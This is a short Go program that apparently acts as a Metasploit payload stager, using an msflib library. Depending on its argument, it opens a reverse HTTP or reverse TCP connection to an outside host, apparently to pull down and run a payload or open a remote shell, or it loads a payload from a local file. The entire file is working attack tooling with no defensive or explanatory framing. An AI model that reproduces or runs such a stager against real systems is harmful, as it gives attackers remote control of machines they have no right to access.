package main

import (
	"github.com/vyrus001/msflib"
	"os"
	"strings"
)

func main() {
	// check args
	if len(os.Args) < 2 {
		os.Exit(0)
	}

	switch {
	case strings.HasPrefix(os.Args[1], "http"):
		msflib.ReverseHTTP(os.Args[1])
	case strings.HasPrefix(os.Args[1], "tcp"):
		msflib.ReverseTCP(os.Args[1])
	default:
		msflib.LoadLocal(os.Args[1]) // assumes Arg[1] is a filename
	}
}
